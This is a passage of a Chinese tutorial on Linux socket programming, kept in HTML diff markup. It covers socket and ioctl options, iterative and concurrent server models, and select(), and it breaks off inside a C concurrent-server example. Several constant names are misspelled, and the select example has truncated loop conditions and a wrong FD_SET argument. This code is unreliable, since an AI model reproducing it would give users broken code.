+ int<br>SO_LINGER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+延迟关闭连
+接&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ struct linger<br>SO_OOBINLINE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+带外数据放入正常数据
+流&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ int<br>SO_RCVBUF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+接收缓冲区大
+小&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ int<br>SO_SNDBUF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+发送缓冲区大
+小&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ int<br>SO_RCVLOWAT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+接收缓冲区下
+限&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ int<br>SO_SNDLOWAT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+发送缓冲区下
+限&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ int<br>SO_RCVTIMEO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+接收超
+时&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ struct timeval<br>SO_SNDTIMEO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+发送超
+时&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ struct timeval<br>SO_REUSERADDR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+允许重用本地地址和端
+口&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ int<br>SO_TYPE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+获得套接字类
+型&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ int<br>SO_BSDCOMPAT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+与BSD系统兼
+容&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ int<br>==========================================================================<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ IPPROTO_IP<br>--------------------------------------------------------------------------<br>IP_HDRINCL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+在数据包中包含IP首
+部&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ int<br>IP_OPTINOS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+IP首部选
+项&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ int<br>IP_TOS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 服务类型<br>IP_TTL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+生存时
+间&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ int<br>==========================================================================<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ IPPRO_TCP<br>--------------------------------------------------------------------------<br>TCP_MAXSEG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+TCP最大数据段的大
+小&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ int<br>TCP_NODELAY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+不使用Nagle算
+法&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ int<br>=========================================================================</p>
+<p>关于这些选项的详细情况请查看 Linux Programmer's Manual </p>
+<p>8.2 ioctl <br>ioctl可以控制所有的文件描述符的情况,这里介绍一下控制套接字的选项. </p>
+<p>int ioctl(int fd,int req,...)</p>
+<p>==========================================================================<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ ioctl的控制选项<br>--------------------------------------------------------------------------<br>SIOCATMARK&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+是否到达带外标
+记&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ int<br>FIOASYNC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+异步输入/输出标
+志&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ int<br>FIONREAD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+缓冲区可读的字节
+数&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ int<br>==========================================================================</p>
+<p>详细的选项请用 man ioctl_list 查看.</p>
+<p><br>(九)Linux网络编程--9. 服务器模型</p>
+<p>学习过《软件工程》吧.软件工程可是每一个程序员"必修"的课程啊.如果你没有学习过, 建议你去看一看. 在这一章里面,<br>我们一起来从软件工程的角度学习网络编程的思想.在我们写程序之前, 我们都应该从软件工程的角度规划好我们的软件,<br>这样我们开发软件的效率才会高. 在网络程序里面,一般的来说都是许多客户机对应一个服务器.为了处理客户机的请求, <br>对服务端的程序就提出了特殊的要求.我们学习一下目前最常用的服务器模型. </p>
+<p>&lt;一&gt;循环服务器:循环服务器在同一个时刻只可以响应一个客户端的请求 </p>
+<p>&lt;二&gt;并发服务器:并发服务器在同一个时刻可以响应多个客户端的请求 </p>
+<p><br>9.1 循环服务器:UDP服务器 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; UDP循环服务器的实现非常简单:UDP服务器每次从套接字上读取一个客户端的请求,处理, 然后将结果返回给客户机. <br>可以用下面的算法来实现. </p>
+<p>&nbsp;&nbsp; socket(...);<br>&nbsp;&nbsp; bind(...);<br>&nbsp;&nbsp; while(1)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; recvfrom(...);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; process(...);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sendto(...);<br>&nbsp;&nbsp; }<br>因为UDP是非面向连接的,没有一个客户端可以老是占住服务端. 只要处理过程不是死循环, 服务器对于每一个客户机的请求总是能够满足. </p>
+<p>9.2 循环服务器:TCP服务器 <br>TCP循环服务器的实现也不难:TCP服务器接受一个客户端的连接,然后处理,完成了这个客户的所有请求后,断开连接. </p>
+<p>算法如下: <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; socket(...);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bind(...);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; listen(...);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while(1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; accept(...);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while(1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ read(...);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ process(...);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ write(...);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(...);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>
+<p>TCP循环服务器一次只能处理一个客户端的请求.只有在这个客户的所有请求都满足后, 服务器才可以继续后面的请求.<br>这样如果有一个客户端占住服务器不放时,其它的客户机都不能工作了.因此,TCP服务器一般很少用循环服务器模型的. </p>
+<p>9.3 并发服务器:TCP服务器 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 为了弥补循环TCP服务器的缺陷,人们又想出了并发服务器的模型. 并发服务器的思想是每一个客户机的请求并不由服务器<br>直接处理,而是服务器创建一个 子进程来处理. </p>
+<p>算法如下: </p>
+<p>&nbsp; socket(...);<br>&nbsp; bind(...);<br>&nbsp; listen(...);<br>&nbsp; while(1)<br>&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; accept(...);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(fork(..)==0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while(1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; read(...);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; process(...);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; write(...);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(...);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(...);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(...);<br>&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp; </p>
+<p>TCP并发服务器可以解决TCP循环服务器客户机独占服务器的情况. 不过也同时带来了一个不小的问题.为了响应客户机的请求,<br>服务器要创建子进程来处理. 而创建子进程是一种非常消耗资源的操作. </p>
+<p>9.4 并发服务器:多路复用I/O <br>为了解决创建子进程带来的系统资源消耗,人们又想出了多路复用I/O模型. <br>首先介绍一个函数select </p>
+<p>int select(int nfds,fd_set *readfds,fd_set *writefds,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fd_set *except fds,struct timeval *timeout)<br>void FD_SET(int fd,fd_set *fdset)<br>void FD_CLR(int fd,fd_set *fdset)<br>void FD_ZERO(fd_set *fdset)<br>int FD_ISSET(int fd,fd_set *fdset)</p>
+<p>一般的来说当我们在向文件读写时,进程有可能在读写出阻塞,直到一定的条件满足. 比如我们从一个套接字读数据时,可能缓冲区里面没有数据可读 
+(通信的对方还没有 发送数据过来),这个时候我们的读调用就会等待(阻塞)直到有数据可读.如果我们不 
+希望阻塞,我们的一个选择是用select系统调用. 只要我们设置好select的各个参数,那么当文件可以读写的时候select回"通知"我们 
+说可以读写了. readfds所有要读的文件文件描述符的集合 <br>writefds所有要的写文件文件描述符的集合 </p>
+<p>exceptfds其他的服要向我们通知的文件描述符 </p>
+<p>timeout超时设置. </p>
+<p>nfds所有我们监控的文件描述符中最大的那一个加1 </p>
+<p>在我们调用select时进程会一直阻塞直到以下的一种情况发生. 1)有文件可以读.2)有文件可以写.3)超时所设置的时间到. </p>
+<p>为了设置文件描述符我们要使用几个宏. FD_SET将fd加入到fdset </p>
+<p>FD_CLR将fd从fdset里面清除 </p>
+<p>FD_ZERO从fdset中清除所有的文件描述符 </p>
+<p>FD_ISSET判断fd是否在fdset集合中 </p>
+<p>使用select的一个例子 </p>
+<p>int use_select(int *readfd,int n)<br>{<br>&nbsp;&nbsp; fd_set my_readfd;<br>&nbsp;&nbsp; int maxfd;<br>&nbsp;&nbsp; int i;<br>&nbsp;&nbsp; <br>&nbsp;&nbsp; maxfd=readfd[0];<br>&nbsp;&nbsp; for(i=1;i<br>&nbsp;&nbsp;&nbsp; if(readfd[i]&gt;maxfd) maxfd=readfd[i];<br>&nbsp;&nbsp; while(1)<br>&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*&nbsp;&nbsp; 将所有的文件描述符加入&nbsp;&nbsp; */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FD_ZERO(&amp;my_readfd);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(i=0;i<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FD_SET(readfd[i],*my_readfd);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /*&nbsp;&nbsp;&nbsp;&nbsp; 
+进程阻
+塞&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; select(maxfd+1,&amp; my_readfd,NULL,NULL,NULL); <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+有东西可以读了&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(i=0;i<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(FD_ISSET(readfd[i],&amp;my_readfd))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 原来是我可以读了&nbsp; */ <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ we_read(readfd[i]);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp; }<br>}</p>
+<p>使用select后我们的服务器程序就变成了. </p>
+<p><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 初始话(socket,bind,listen);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; while(1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 设置监听读写文件描述符(FD_*);&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 调用select;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果是倾听套接字就绪,说明一个新的连接请求建立<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; { <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 建立连接(accept);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 加入到监听文件描述符中去;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 否则说明是一个已经连接过的描述符<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 进行操作(read或者write);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ </p>
+<p>多路复用I/O可以解决资源限制的问题.这模型实际上是将UDP循环模型用在了TCP上面. 这也就带来了一些问题.<br>如由于服务器依次处理客户的请求,所以可能会导致有的客户 会等待很久. </p>
+<p>9.5 并发服务器:UDP服务器 <br>人们把并发的概念用于UDP就得到了并发UDP服务器模型. 并发UDP服务器模型其实是简单的.和并发的TCP服务器模型一样是创建<br>一个子进程来处理的 算法和并发的TCP模型一样. <br>除非服务器在处理客户端的请求所用的时间比较长以外,人们实际上很少用这种模型. </p>
+<p><br>9.6 一个并发TCP服务器实例 </p>
+<p>#include &lt;stdlib.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;errno.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;netdb.h&gt;<br>#include &lt;sys/socket.h&gt;<br>#include &lt;netinet/in.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;arpa/inet.h&gt;</p>
+<p>#define MY_PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 8888</p>
+<p>int main(int argc ,char **argv)<br>{<br>int listen_fd,accept_fd;<br>struct sockaddr_in&nbsp;&nbsp;&nbsp;&nbsp; client_addr;<br>int n;</p>
+<p>if((listen_fd=socket(AF_INET,SOCK_STREAM,0))&lt;0)<br>&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Socket Error:%s\n\a",strerror(errno));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp; }</p>
+<p>bzero(&amp;client_addr,sizeof(struct sockaddr_in));<br>client_addr.sin_family=AF_INET;<br>client_addr.sin_port=htons(MY_PORT);<br>client_addr.sin_addr.s_addr=htonl(INADDR_ANY);<br>n=1;<br>/* 如果服务器终止后,服务器可以第二次快速启动而不用等待一段时间&nbsp; */<br>setsockopt(listen_fd,SOL_SOCKET,SO_REUSEADDR,&amp;n,sizeof(int));<br>if(bind(listen_fd,(struct sockaddr *)&amp;client_addr,sizeof(client_addr))&lt;0)<br>&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Bind Error:%s\n\a",strerror(errno));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp; }<br>&nbsp; listen(listen_fd,5);<br>&nbsp; while(1)<br>&nbsp; {<br>&nbsp;&nbsp; accept_fd=accept(listen_fd,NULL,NULL);<br>&nbsp;&nbsp; if((accept_fd&lt;0)&amp;&amp;(errno==EINTR))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; continue;<br>&nbsp;&nbsp; else if(accept_fd&lt;0)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Accept Error:%s\n\a",strerror(errno));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; continue;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp; if((n=fork())==0)<br>&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 子进程处理客户端的连接 */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char buffer[1024];</p>
